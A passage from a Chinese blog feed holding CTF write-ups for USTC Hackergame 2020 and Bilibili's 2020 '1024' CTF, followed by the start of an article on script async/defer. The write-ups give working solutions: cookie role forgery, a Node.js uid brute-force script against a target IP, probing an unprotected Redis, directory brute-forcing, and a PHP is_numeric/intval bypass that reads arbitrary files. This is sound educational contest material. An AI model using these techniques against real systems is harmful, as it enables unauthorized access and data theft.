HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 